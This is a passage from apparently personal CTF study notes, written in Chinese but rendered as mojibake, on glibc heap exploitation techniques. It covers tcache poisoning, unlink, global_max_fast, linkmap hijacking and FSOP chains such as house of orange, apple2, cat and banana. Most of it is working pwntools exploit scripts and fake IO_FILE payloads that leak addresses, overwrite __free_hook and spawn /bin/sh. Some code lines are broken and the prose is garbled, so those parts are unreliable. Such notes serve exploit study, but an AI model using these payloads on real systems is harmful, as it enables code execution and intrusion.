delete(1)

p.interactive()

#---------æ— edit-------------------------------------------------

read_channel(0x138,'1')# 9
dele(9)
dele(6)
read_channel(0x8f0,'1'*(0x860*8)+bin(free_hook)[2:][::-1])#6
read_channel(0x138,bin(0x68732f6e69622f)[2:][::-1])#9
read_channel(0x138,bin(system)[2:][::-1])#10
dele(9)

```




#### å †å—åˆå¹¶

unlinkä¸»è¦æ˜¯ç”¨äºåœ¨é‡Šæ”¾å†…å­˜æ—¶ï¼Œä»åŒå‘é“¾è¡¨ä¸­ç§»é™¤ç›¸åº”çš„å—ã€‚

```c
//åŸæœ¬æ˜¯å®å®šä¹‰å‡½æ•°ï¼Œè¿›è¡Œä¿®æ”¹
/* Take a chunk off a bin list */
int unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");			      \
    FD = P->fd;								      \
    BK = P->bk;								      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \
      malloc_printerr ("corrupted double-linked list");			      \
    else {								      \
        FD->bk = BK;							      \
        BK->fd = FD;							      \
        if (!in_smallbin_range (chunksize_nomask (P))			      \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {		      \
	    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)	      \
		|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
	      malloc_printerr ("corrupted double-linked list (not small)");   \
            if (FD->fd_nextsize == NULL) {				      \
                if (P->fd_nextsize == P)				      \
                  FD->fd_nextsize = FD->bk_nextsize = FD;		      \
                else {							      \
                    FD->fd_nextsize = P->fd_nextsize;			      \
                    FD->bk_nextsize = P->bk_nextsize;			      \
                    P->fd_nextsize->bk_nextsize = FD;			      \
                    P->bk_nextsize->fd_nextsize = FD;			      \
                  }							      \
              } else {							      \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      \
              }								      \
          }								      \
      }									      \
}
```

builtin_expect æ˜¯ä¸€ä¸ªç¼–è¯‘å™¨å†…ç½®å‡½æ•°ï¼Œç”¨äºæç¤ºåˆ†æ”¯é¢„æµ‹ï¼Œæé«˜ä»£ç æ‰§è¡Œæ•ˆç‡ã€‚åœ¨è¿™é‡Œï¼Œå®ƒç”¨äºå¤„ç†å¼‚å¸¸æƒ…å†µçš„é”™è¯¯æ£€æŸ¥ã€‚

å †å—åˆå¹¶åˆå«å †å ï¼Œæ˜¯ä½¿ç”¨å †æº¢å‡ºæˆ–è€…offbyoneç­‰æ¼æ´å®ç°çš„æŠ€æœ¯ã€‚UAFæ˜¯ä¸€ä¸ªç¬¼ç»Ÿçš„æ¦‚å¿µï¼Œæ—¢å¯ä»¥æŒ‡freeåæ²¡æœ‰åœ¨ç´¢å¼•è¡¨bss_chunk_manageå¤„ç½®ç©ºå †å—ï¼Œåˆå¯ä»¥æŒ‡use afterfree addrï¼Œä½¿ç”¨freeåçš„å †å—æ®‹ç•™çš„åœ°å€ã€‚å‰è€…çœ‹freeï¼Œåè€…çœ‹addæˆ–editã€‚

* å †å å®é™…ä¸Šå°±æ˜¯äººå·¥æ„é€ äº†UAF(ç¬¬ä¸€ç§)
* UAFAæ˜¯glibcçš„æœºåˆ¶ï¼Œä¹Ÿå«åšç²˜è¿åœ°å€ï¼Œæ˜¯é€šå¸¸è·å–åœ°å€çš„æ‰‹æ®µï¼ŒåŸç†æ˜¯å †å—freeåæ”¾å…¥binä¸­ä¼šè¢«glibcå†™å…¥ä¸€äº›åœ°å€ï¼ˆå¦‚æœaddæˆ–è€…editä¼šå¯¼è‡´è¾“å…¥ç»“å°¾æœ‰\\x00ï¼Œé‚£UAFAå°±ç”¨ä¸äº†ï¼‰ã€‚malloc_consolideã€é—´éš”freeå¤§å †å—è¿™äº›éƒ½å±äºUAFA

UAFçš„åç»­åˆ©ç”¨ä¸€ä¸ªæ˜¯æ”¹fdï¼Œä¸€ä¸ªæ˜¯double_free

### double free
00çš„å½¢å¼ï¼Œfastbinä¸æ”¯æŒï¼Œtcache
010çš„å½¢å¼ï¼Œfastbinæ˜¯æ”¯æŒçš„ï¼Œtcacheä¸€ç›´éƒ½ä¸æ”¯æŒ
ä¸»è¦æ˜¯æ£€æµ‹å½“å‰é‡Šæ”¾å †å—

tcache çœ‹ä½ freeçš„å †å—æ˜¯å¦æœ‰bkæŒ‡é’ˆï¼ˆå¸¦æœ‰tcachebinå †å—ä¿¡æ¯çš„é‚£ç§ï¼‰
fastbin çœ‹ä½ freeçš„å †å—æ˜¯å¦æ˜¯å¤´èŠ‚ç‚¹      æ›´å®¹æ˜“ç»•è¿‡ï¼Œç”¨äºæ²¡æœ‰editåŠŸèƒ½çš„æ—¶å€™


### malloc(<=0xff)+UAF

0xffåœ¨fastbinèŒƒå›´å¤–çš„ï¼Œæ˜“äºå¾—åˆ°unsortbinï¼Œç»“åˆshowåŠŸèƒ½æ˜“äºè·å¾—libcåœ°å€
åŠŸèƒ½å¥å…¨ï¼Œåˆèƒ½ä½¿ç”¨tcacheï¼Œåˆ©ç”¨poisonå³å¯åˆ©ç”¨

```python
def add(idx,size):
    sla(">",1)
    sla("Index: ",idx)
    sla("Size: ",size)

def edit(idx,con):
    sla(">",3)
    sla("Index: ",idx)
    p.sendafter("Content: ",con)

def show(idx):
    sla(">",4)
    sla("Index: ",idx)

def dele(idx):
    sla(">",2)
    sla("Index: ",idx)



# å¡«å……tcacheï¼Œé‡Šæ”¾ä¸€ä¸ªåˆ°unsortbin
for i in range(8):
    add(i, 0x90)# 0-7
add(8, 0x20)# é˜²æ­¢åˆå¹¶ï¼Œåé¢ç”¨äºè¡¥ä¸€ä¸ªtcacheä½ç½®
for i in range(8):
    dele(i)
# æ³„éœ²å †åœ°å€
show(0)
key = u64(p.recv(5).ljust(8,'\x00'))
lg('key')
heap_base = key<<12
lg('heap_base')
# æ³„éœ²libcåœ°å€
edit(7, 'a')# main_arenaä½åœ°å€ä¸º\x00
show(7)
libc_base = l64() - 0x1e3c61
lg('libc_base')
free_hook = libc_base + libc.sym["__free_hook"]
system_addr = libc_base + libc.sym["system"]
edit(7, '\x00')# æ¢å¤

# åˆ‡å‰²unsortbinï¼Œæ„é€ tcache poison
add(9, 0x20)
add(10, 0x20)
edit(10, "/bin/sh\x00")# æ”¾binsh

dele(8)# 
dele(9)# 9-> 8

edit(9, p64(free_hook ^ key))
add(11, 0x20)
add(12, 0x20)
edit(12, p64(system_addr))

dele(10)
ia()
```


### IOåˆ©ç”¨

ç‰¹æ®Šçš„å †åˆ©ç”¨æ‰‹æ®µï¼Œç”¨äºåœ¨ç‰¹å®šæƒ…å†µä¸‹æ ¹æ®å †æ¼æ´ä¸€æµç¨‹çš„å®Œæˆè·å–flag

#### ä¿®æ”¹Linkmapç¨‹åºåŸºåœ°å€&fini_array

åŠ«æŒLinkmapé“¾è¡¨ä¸­å­˜æ”¾çš„ç¨‹åºåŸºåœ°å€ä¸ºone_gadgetåœ°å€-0x3d70(fini_array_addr)ï¼Œå¯¼è‡´è§¦å‘fini_arrayæ—¶è§¦å‘one_gadget




```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
p = process("./manageheap")
elf = ELF("./manageheap")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
# context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','--title', 'gdb', 'bash', '-c']
context.terminal = ['tmux', 'splitw', '-hp','60']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(size,name,id_con='a'):
    sla("Your Choice:",1)
    sla("please input your major's number:",size)
    p.sendafter("please input your name:",name)
    sa("> \n",id_con)

def show(idx):
    sla("Your Choice:",3)
    sla("input your idx:",idx)

def edit(idx,id_con,new_con):
    sla("Your Choice:",4)
    sla("input your idx:",idx)
    sa("please input your id:",id_con)
    s(new_con)

def dele(idx):
    sla("Your Choice:",2)
    sla("input your idx:",idx)

# æ‹¿åœ°å€
heap_base = uu64()-0x2d0
lg('heap_base')
key = heap_base>>12
lg('key')
libc_base = l64()-0x219c61-0x500
lg('libc_base')
link_map = libc_base + 0x2652e0 # search -p "0x5588228e5000" ï¼Œç„¶åå»çœ‹

pwndbg> tel 0x7f651f76f2c0
00:0000â”‚  0x7f651f76f2c0 â€”â–¸ 0x5588228e5000 â—‚â€” 0x10102464c457f   0x7f651f76f2c0è¿™ä¸ªå°±æ˜¯
01:0008â”‚  0x7f651f76f2c8 â€”â–¸ 0x7f651f76f880 â—‚â€” 0x0    è¿™ä¸ªä½ç½®æ˜¯åå­—ï¼Œç¨‹åºæœ¬èº«å°±æ˜¯ç©º
02:0010â”‚  0x7f651f76f2d0 â€”â–¸ 0x5588228ec000 â—‚â€” 0x1d   è¿™é‡Œéƒ½æ˜¯1d
03:0018â”‚  0x7f651f76f2d8 â€”â–¸ 0x7f651f76f890(è¿™ä¸ªåœ°å€å°±æ˜¯next_loadbananaçš„) â€”â–¸ 0x7ffd2b13a000 â—‚â€” jg 0x7ffd2b13a047
04:0020â”‚  0x7f651f76f2e0 â—‚â€” 0x0
05:0028â”‚  0x7f651f76f2e8 â€”â–¸ 0x7f651f76f2c0 â€”â–¸ 0x5588228e5000 â—‚â€” 0x10102464c457f
06:0030â”‚  0x7f651f76f2f0 â—‚â€” 0x0
07:0038â”‚  0x7f651f76f2f8 â€”â–¸ 0x7f651f76f868 â€”â–¸ 0x7f651f76f880 â—‚â€” 0x0


lg("link_map")
one = libc_base + 0xebcf1

edit(1,p64((heap_base+0xc20)^key),p64(link_map^key))
add(0x49,'a'*0x10)# 5
add(0x49,p64(one)'æ”¾one',p64(heap_base+0x740-0x3D70))# 6

# exit

ia()
```

#### é€šè¿‡_IO_buf_baseä»»æ„å†™

åˆ©ç”¨å‰ææ˜¯ libcä»»æ„åœ°å€å†™'\x00' ä¸€ä¸ªå³å¯
(æ³¨æ„ï¼šå¯¹IO_buf_baseï¼ˆå³ç¼“å†²åŒºï¼‰å†™å†…å®¹çš„æ—¶å€™è¦ç”¨send! ï¼ˆscanfé™¤å¤–ï¼‰)

åŸç†ï¼š
å½“å¯ä»¥å®ç°ä»»æ„åœ°å€å†™0æ—¶ï¼Œå¯ä»¥å°†stdinçš„IO_buf_baseçš„ä½ä½è®¾ç½®ä¸º0ï¼Œè¿™æ ·å¯ä»¥ä½¿å¾—ä¸‹æ¬¡**å†ä½¿ç”¨IOè¾“å…¥å‡½æ•°**è¿›è¡Œè¾“å…¥æ—¶å°±ä¼šåœ¨IO_buf_baseä¸Šæ–¹è¿›è¡Œè¾“å…¥ä»è€Œè¦†ç›–IO_buf_baseçš„å€¼ï¼Œ**å†æ¬¡ä½¿ç”¨IOè¾“å…¥å‡½æ•°**å°±èƒ½å®ç°ä»»æ„åœ°å€å†™äº†
é€šå¸¸ä¼šç»“åˆç›´æ¥å†™IO_stdoutç»“æ„ä½“å®ç°è§¦å‘houseofapple2
è¯¦ç»†å¦‚ä¸‹
æ‰§è¡Œç±»scanf IOè¾“å…¥å‡½æ•°æ—¶ï¼Œæœ€ç»ˆä¼šæ‰§è¡Œ

```c
count = _IO_SYSREAD(fp, fp->_IO_buf_base, fp->_IO_buf_end - fp->_IO_buf_base);
```

å³**è¾“å…¥ç¼“å†²åŒº**åœ¨å†…å­˜ä¸­çš„`fp->_IO_buf_base`è¿™ä¸ªåœ°å€
\_IO_2_1_stdin_çš„åŸæœ¬å€¼å¯èƒ½å°±æ˜¯_IO_2_1_stdin_é™„è¿‘çš„å€¼ï¼Œå› æ­¤è‹¥æˆ‘ä»¬å†™_IO_buf_baseçš„æœ€ä½å­—èŠ‚ä¸º0ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¾ˆæœ‰å¯èƒ½å¯ä»¥**è®©_IO_buf_baseå’Œ_IO_buf_endä¹‹é—´åŒ…æ‹¬_IO_buf_base**ï¼Œä»è€Œå®ç°ä»»æ„åœ°å€å†™

```python
# step 2 : printf -> stdout -> house of apple2

environ = libc_base + libc.sym['__environ']
system = libc_base + libc.sym['system']
bin_sh = libc_base + libc.search('/bin/sh\x00').next()
stdin = libc_base + libc.sym['_IO_2_1_stdin_']
stdin_IO_buf_base = stdin + 7*8
stdin_old_value = stdin + 0x83
stdout = libc_base + libc.sym['_IO_2_1_stdout_']
stderr = libc_base + libc.sym['_IO_2_1_stderr_']
_IO_wfile_jumps = libc_base + 0x202228


base_addr = stdout
fake_io = b'  sh;\x00\x00\x00' # fad0x1800 rdi
fake_io = fake_io.ljust(0x68, b'\x00')
fake_io += p64(system)
fake_io = fake_io.ljust(0x88, b'\x00')
fake_io += p64(base_addr + 0x5000) # _lock
fake_io += p64(0)*2
fake_io += p64(base_addr)
fake_io = fake_io.ljust(0xd8, b'\x00')
fake_io += p64(_IO_wfile_jumps - 0x20)
fake_io = fake_io.ljust(0xe0, b'\x00')
fake_io += p64(base_addr)

sla(b'> ', b'2')
sla(b'Mem: ', hex(stdin_IO_buf_base))# åˆ©ç”¨åŠŸèƒ½å°†stdin io_buf_baseä½ä½ç½®ä¸º0
# å›åˆ°è¾“å…¥é€‰é¡¹çš„getchar()å³scanf
sa(b'> ', p64(stdin_old_value)*3 + p64(base_addr) + p64(base_addr + len(fake_io)+1))# ä¸€ç›´è¾“å…¥ç›´åˆ°IO_buf_baseä¿®æ”¹ä¸ºstdoutç»“æ„ä½“çš„åœ°å€

sl(fake_io)
```

æ³¨æ„ï¼š
ç‰¹åˆ«çš„æƒ…å†µä¸‹ï¼Œåœ¨è¦†ç›–IO_buf_baseä»¥åï¼Œå†è¿›è¡ŒIOè¾“å…¥æ—¶ï¼Œç”±äºè®¾ç½®çš„ç¼“å†²åŒºä½ç½®å¤ªè¿œä¼šå­˜åœ¨æ£€æµ‹

```c
if (fp->_IO_read_ptr < fp->_IO_read_end)
	return *(unsigned char *)fp->_IO_read_ptr;
// å‡å¦‚_IO_read_ptr<_IO_read_endå°±ä¸èƒ½æ‰§è¡Œåˆ°æˆ‘ä»¬çš„read
```

è¿™æ—¶è¦ä½¿ç”¨åˆ°

```c
IO_getc(stdin); //æ¸…é™¤ç¼“å†²åŒºä¸­scanfç•™ä¸‹çš„æ¢è¡Œç¬¦
or
getchar();//å¯ä»¥è¾“å…¥æ»¡è¾“å…¥ç¼“å†²åŒº
//ä»è¾“å…¥ç¼“å†²åŒºä¸­è¯»å–ä¸€ä¸ªå­—ç¬¦å¹¶è¿”å›è¯¥å­—ç¬¦ã€‚åœ¨è¯»å–ä¸€ä¸ªå­—ç¬¦åï¼Œç¼“å†²åŒºä¸­å¯¹åº”çš„ç©ºé—´å°±ä¼šè¢«é‡Šæ”¾
```

ä½¿ç”¨åä¼šä½¿å¾—_IO_read_ptr+1ï¼Œåå¤ä½¿ç”¨ç›´åˆ°ä¸endç›¸ç­‰
#### mp_.tcache_bins

æ¼æ´ç‚¹ï¼šmp_.tcache_binså¯è¢«å†™ä¸ºä¸€ä¸ªå¤§å€¼

```python
add(size)# è¿™é‡Œsizeè¦>0x430
# å¸ƒç½®ä½ï¼šheap_base + (size>>4 *8)+0x88

add(0, 0x528)
add(1, 0x600)
add(2, 0x518)

dele(0)
add(3,0x900)
show(0)
libc_base = l64()-0x1e4030
main_arena = libc_base+0x1e4030
lg('libc_base')
mp_ = libc_base + 0x1e3280 # p &mp_
free_hook = libc_base + libc.sym["__free_hook"]
system_addr = libc_base + libc.sym["system"]
lg('mp_')

edit(0,'a'*0x10)
show(0)
ru("a"*0x10)
heap_base = uu64()-0x290
lg('heap_base')
key = heap_base>>12
lg('key')

edit(0,p64(main_arena)*2)
dele(2)
pay = p64(main_arena)*2 + p64(0) + p64(mp_+0x50-0x20)
edit(0,pay)
add(3,0x900)
# -------------------------------------------------------------------
# ---Largebinattackå

dele(1)# 0x600
edit(0,"a"*0xe8 + p64(free_hook))

add(1,0x600)
edit(1, p64(system_addr))
edit(0, "/bin/sh\x00")
dele(0)
ia()
```



![image-20220409223332707](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220409223332707.png)

![image-20220403180012397](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220403180012397.png)

`0x0000564ce2ed6000+0x90`

#### global_fast

æ¼æ´ç‚¹ï¼šglobal_fastå¯è¢«å†™ä¸ºä¸€ä¸ªå¤§å€¼

åœ¨å¯ä»¥ç”³è¯·0xffffç±»å¤§å †çš„æƒ…å†µä¸‹(**ä»»æ„åœ°å€å†™ä»»æ„å€¼**ï¼Œä»»æ„å€¼è¦æ±‚èƒ½UAF)

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
p = process("./heap2019")
elf = ELF("./heap2019")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','60']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(size,con='a'):
    sla("4.exit",1)
    sla("Content length:",size)
    p.sendafter("Content:",con)

def edit(con):
    sla("4.exit",2)
    p.sendafter("Comment:",con)

def dele(idx):
    sla("4.exit",3)
    sla("Content id:",idx)

# æ¼æ´ç‚¹æ˜¯ä»»æ„åœ°å€å†™deadbeef
sla("4.exit",2019)
p.recvuntil("0x")
base = int(p.recv(12),16)-0x202040
lg('base')

add(0x410,'a')# 0
add(0x400,'a')# 1
add(0x420,'a')# 2
add(0x408,'a'*0x400+'/bin/sh\x00')# 3 ä¼ªé€ IO

dele(0)
dele(2)
add(0x2333,'a')# 0
add(0x420,'a')# 2
ru("Data is:\n")
heap_base = uu64()-0x61
lg('heap_base')

add(0x410,'a')# 4
ru("Data is:\n")
libc_base = l64()-0x3c4f00-0x61
lg('libc_base')
system = libc_base + libc.sym['system']
IO_list_all = libc_base + 0x3c5520
lg('IO_list_all')
global_max_fast = libc_base + 0x3c67f8
# ---------------------------------------------
# p &main_arena.fastbinsY
# p &global_max_fast
add(size) 
# delta = IO_list_all/free_hook - main_arena.fastbinsY_addr
# size = (delta * 2) + 0x10
pay = IO_FILE
edit(chunk,pay)
# ä¸€æ®µæ”»å‡»
dele(chunk) # å†™å…¥å †åœ°å€
# äºŒæ®µæ”»å‡»,åˆ©ç”¨UAF
# edit(chunk,p64(system))
# add(chunk)//å†™å…¥system


dele(0)
vtable = heap_base + 0x001150
pay = p64(0)*2
pay += p64(0) + p64(1)
pay = pay.ljust(0xC0,'\x00')
pay += p64(0)+p64(vtable)
# vtable
pay += p64(0)*3
pay += p64(system)
add(0x1400,pay)# 0

edit('a'*0x20+p64(global_max_fast))
dele(0)# IO_list_allå†™å…¥å †åœ°å€

sla("4.exit", '4')
ia()
```

#### FSOP

##### åŠ«æŒstdoutç­‰ç»“æ„ä½“è§¦å‘FSOP

å¸¸è§„FSOPé€šè¿‡exitç­‰å‡½æ•°è§¦å‘ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä»¥ä¸‹é“¾è§¦å‘

```
printf -> stdout -> house of apple2
```

```shell
 â–º 0   0x7f8179d44cb5 __printf_buffer_to_file_done+213
   1   0x7f8179d44cb5 __printf_buffer_to_file_done+213
   2   0x7f8179d4f733 __vfprintf_internal+579
   3   0x7f8179d441a3 printf+179
   4   0x563be4b3e2c3 main+163
```

å‚è€ƒIO_buf_baseä»»æ„åœ°å€å†™

##### 2.23ç‰ˆæœ¬

åŸç†ï¼š
FSOP é€‰æ‹©çš„è§¦å‘æ–¹æ³•æ˜¯è°ƒç”¨_IO_flush_all_lockpï¼Œè¿™ä¸ªå‡½æ•°ä¼šåˆ·æ–°_IO_list_all é“¾è¡¨ä¸­æ‰€æœ‰é¡¹çš„æ–‡ä»¶æµï¼Œç›¸å½“äºå¯¹æ¯ä¸ª FILE è°ƒç”¨ fflushï¼Œä¹Ÿå¯¹åº”ç€ä¼šè°ƒç”¨_IO_FILE_plus.vtable ä¸­çš„_IO_overflowã€‚è€Œ_IO_flush_all_lockp ä¸éœ€è¦æ”»å‡»è€…æ‰‹åŠ¨è°ƒç”¨ï¼Œåœ¨ä¸€äº›æƒ…å†µä¸‹è¿™ä¸ªå‡½æ•°ä¼šè¢«ç³»ç»Ÿè°ƒç”¨ï¼š
1. å½“ libc æ‰§è¡Œ abort æµç¨‹æ—¶
2. å½“æ‰§è¡Œ exit å‡½æ•°æ—¶
3. å½“æ‰§è¡Œæµä» main å‡½æ•°è¿”å›æ—¶

```python
system = libc_base + libc.sym['system']

vtable = heap_base + 0x001150
# pay = '/bin/sh\x00'+p64(size)
pay += p64(0)*2 # å¯è¢«ä¿®æ”¹
pay += p64(0) + p64(1)
pay = pay.ljust(0xC0,'\x00')
pay += p64(0)+p64(vtable)
# vtable
pay += p64(0)*3
pay += p64(system)# one_gadget
```

##### 2.27ç‰ˆæœ¬(IO_str_jumpså›ºå®šè·³è¡¨)

```python
def FILE(binsh,system,IO_str_jumps):
	fake_IO_FILE  = p64(0xfbad1800) + p64(0)*3
	fake_IO_FILE += p64(0) + p64(0xffffffffffffffff) # fp->_IO_write_ptr > fp->_IO_write_base; pos >= (_IO_size_t) (_IO_blen (fp) + flush_only)
	fake_IO_FILE += p64(0)*2 + p64((binsh-100)//2)
	fake_IO_FILE = fake_IO_FILE.ljust(0xC0,'\x00')
	fake_IO_FILE += p64(0) + p64(0)*2	# _mode <= 0
	fake_IO_FILE += p64(IO_str_jumps)
	fake_IO_FILE += p64(system) # 0xe0 
	return fake_IO_FILE

```

##### 2.39ç‰ˆæœ¬(house of apple2ç»“æ„ä½“)

```python
_IO_wfile_jumps = libc_base + 0x202228

base_addr = stdout

fake_io = b'  sh;\x00\x00\x00' 
fake_io = fake_io.ljust(0x68, b'\x00')
fake_io += p64(system)
fake_io = fake_io.ljust(0x88, b'\x00')
fake_io += p64(base_addr + 0x5000) # _lock
fake_io += p64(0)*2
fake_io += p64(base_addr)
fake_io = fake_io.ljust(0xd8, b'\x00')
fake_io += p64(_IO_wfile_jumps - 0x20)
fake_io = fake_io.ljust(0xe0, b'\x00')
fake_io += p64(base_addr)
```

##### 2.36ç‰ˆæœ¬(house of catç»“æ„ä½“)

åªéœ€ä¿®æ”¹**fake_io_addr**åœ°å€ï¼Œ**\_IO_save_end**ä¸ºæƒ³è¦è°ƒç”¨çš„å‡½æ•°ï¼Œ**\_IO_backup_base**ä¸ºæ‰§è¡Œå‡½æ•°æ—¶çš„rdxï¼Œä»¥åŠä¿®æ”¹_flagsä¸ºæ‰§è¡Œå‡½æ•°æ—¶çš„rdi;

![å›¾ç‰‡æè¿°](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/959842_JDJKTRK7GJUEUFR.png)

```python
setcontext = libc_base + libc.sym['setcontext'] + 61
IO_wfile_jumps = libc_base + 0x1f30a0
one_gadget = libc_base + 0x105fb7

heap_base = libc_base-0x034000 # heap_base
fake_io_addr = heap_base+0x10 # IO_list_allæ”¾çš„åœ°å€

next_chain = 0
fake_IO_FILE  = p64(0xfbad1800) + p64(0) # _flag = '/bin/sh'/rdi
fake_IO_FILE += p64(0)*2
fake_IO_FILE += p64(0)+p64(0xffffffffffffffff)
fake_IO_FILE += p64(0)+p64(0)
fake_IO_FILE += p64(1)+p64(2)
fake_IO_FILE += p64(fake_io_addr+0xb0) # _IO_backup_base = setcontext_rdx/rdx
fake_IO_FILE += p64(one_gadget) # _IO_save_end = call addr(call setcontext)
fake_IO_FILE =  fake_IO_FILE.ljust(0x68, '\x00')
fake_IO_FILE += p64(0) # _chain
fake_IO_FILE =  fake_IO_FILE.ljust(0x88, '\x00')
fake_IO_FILE += p64(heap_base) # _lock = a writable address
fake_IO_FILE =  fake_IO_FILE.ljust(0xa0, '\x00')
fake_IO_FILE += p64(fake_io_addr+0x30) #_wide_data,rax1_addr
fake_IO_FILE =  fake_IO_FILE.ljust(0xc0, '\x00')
fake_IO_FILE += p64(1) 
fake_IO_FILE =  fake_IO_FILE.ljust(0xd8, '\x00')
fake_IO_FILE += p64(IO_wfile_jumps+0x30)  # vtable
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr

sl(fake_IO_FILE)
# sl(fake_IO_FILE[0x10:])

```



#### house of orange

é€‚ç”¨èŒƒå›´ï¼š2.23â€”â€”2.26
æ²¡æœ‰ freeï¼Œå¯ä»¥ unsortedbin attack

åˆ©ç”¨åŸç†ï¼š
å…ˆåˆ©ç”¨sysmalloc_int_freeçš„æŠ€å·§ï¼Œå°†åŸæ¥çš„topchunkæ”¾å…¥unsortbinä¸­ï¼ˆè¢«freeçš„æ—§topchunksizeè¿˜è¦å‡å»FENCEPOSTä¸€èˆ¬ä¸º0x20ï¼‰
å†åˆ©ç”¨å †æº¢å‡ºä¿®æ”¹è¿™ä¸ªfreeçš„topchunkä¸ºä¸‹é¢ç»“æ„ä½“
ç”³è¯·é 0x60 å¤§å°çš„ chunk çš„æ—¶å€™ï¼Œé¦–å…ˆè§¦å‘ unsortedbin attackï¼Œå°†_IO_list_all ä¿®æ”¹ä¸º main_arena+88ï¼Œç„¶å unsortedbin chunk ä¼šè¿›å…¥åˆ° smallbinï¼Œå¤§å°ä¸º 0x60ï¼›æ¥ç€éå† unsortedbin çš„æ—¶å€™è§¦å‘äº† malloc_printerrï¼Œç„¶åè°ƒç”¨é“¾ä¸ºï¼š malloc_printerr -> libc_message -> abort -> \_IO_flush_all_lockpï¼Œè°ƒç”¨åˆ°ä¼ªé€ çš„ vtable é‡Œé¢çš„å‡½æ•°æŒ‡é’ˆ
åœ¨ glibc-2.24 ååŠ å…¥äº† vtable çš„ checkï¼Œä¸èƒ½ä»»æ„åœ°å€ä¼ªé€  vatble äº†ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨ IO_str_jumps ç»“æ„è¿›è¡Œåˆ©ç”¨ã€‚
åœ¨ glibc-2.26 åï¼Œmalloc_printerr ä¸å†åˆ·æ–° IO æµäº†ï¼Œæ‰€ä»¥è¯¥æ–¹æ³•å¤±æ•ˆ

![image-20220507104532095](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220507104532095.png)




#### house of banana

æ³¨æ„ï¼š
* æ‰¾åœ°å€å‚ç…§<Linkmapç¨‹åºåŸºåœ°å€>
* è¿™æ¡é“¾è¿˜ä¼šæ ¡éªŒå†™åœ¨rtld_globalä¸Šå †åœ°å€ + 0x3e0çš„ä½ç½®ï¼Œæ‰€ä»¥è¦ä¿æŒå¤§èŒƒå›´çš„æ¸…æ´ï¼Œé€‰æ‹©æ”¾ç½®IOç»“æ„ä½“çš„ä½ç½®è¦è°¨æ…
* rtld_globalä¸Šå†™çš„å †åœ°å€æ˜¯headå¤´çš„åœ°å€
* è¦ä¼ªé€ headå¤´fake_heap_addr + 0x20ï¼
* ç»“æ„ä½“å¤§å°0x334æ˜¯ç›¸å¯¹äºrtld_globalä¸Šå †åœ°å€+0x10çš„ï¼Œæ³¨æ„å˜æ¢å¤§å°

åˆ©ç”¨é“¾ï¼š

```c
exit-> __run_exit_handlers->_dl_fini->_dl_fini+520(setcontext)

è¿›  _dl_fini
2.36ä»¥ä¸Šæ˜¯call rax   å¯å‚è€ƒ /mnt/hgfs/ctf/hgame/without_hook
2.30æ˜¯call rdx

```

##### 2.31-2.36

```python
# UAF
